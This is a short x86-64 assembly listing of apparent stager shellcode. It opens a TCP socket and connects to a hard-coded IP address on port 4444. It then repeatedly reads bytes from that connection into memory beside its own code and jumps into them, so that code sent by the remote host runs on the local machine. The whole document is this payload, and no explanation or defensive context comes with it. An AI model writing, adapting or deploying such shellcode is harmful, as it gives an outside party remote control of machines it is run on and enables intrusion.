BITS 64
; socket(2, 1, 0)
main:
    jmp socket
loop:
    push byte 0x2d
    pop rax
    push rbx
    pop rdi
    lea rsi, [rbp + 0x17]
    push byte 0x7f
    pop rdx
    xor r10, r10
    xor r8, r8
    xor r9, r9
    syscall
socket:
    ; socket(2, 1, 0)
    push byte 0x29
    pop rax
    cdq
    push byte 0x2
    pop rdi
    push byte 0x1
    pop rsi
    syscall
    ; store sock_fd in rbx
    push rax
    pop rbx
    ; connect(s, [2, port, ip], 16)
    xchg rax, rdi
    push 0x7a1280b2     ; ip
    push word 0x5c11    ; port
    push word 0x2
    push rsp
    pop rsi
    mov dl, 0x10
    mov al, 0x2a
    syscall
    ; store loop
    lea rbp, [rel loop]
    jmp rbp

